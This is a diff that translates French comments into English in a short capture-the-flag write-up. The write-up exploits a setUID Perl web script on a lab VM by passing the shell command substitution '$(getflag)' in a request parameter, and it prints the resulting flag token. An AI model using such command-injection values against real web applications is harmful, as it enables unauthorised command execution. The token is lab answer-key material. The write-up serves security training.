@@ -1,21 +1,21 @@
-#Le fichier est un fichier perl mais aussi un setUID de flag04
+#The file in our home is a perl file setUID of flag04
 
 cat level04.pl
 
-#Apres lecture du fichier on s'apercoit que c'est un page web sur le port 4747 
-#J'ouvre donc un navigateur a l'addresse de ma vm
+#After a quick read, we observe that the file is a web page running on port 4747
+# Lets get on a web browser and reach my vm adress on port 4747
 
 http://10.11.200.127:4747/
 
-#Il s'agit d'un serveur web, je peux donc acceder au fichier en question
+#It is a web server so i can reach the script through it
 
 http://10.11.200.127:4747/level04.pl
 
-#En observant on voit que le fichier affiche a l'ecran la sortie d'une commande echo de x
-#Il suffit setter x via un requete post et faire un petit trick afin d'echo la sortie de getflag
+#We can see that it print the content of a variable x
+# to exploit that breach, we must set x through a post request and do a little trick to print the output of getflag instead
 
 http://10.11.200.127:4747/level04.pl?method=post&x=$(getflag)
 
-#On obtiens
+#It Works !
 
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
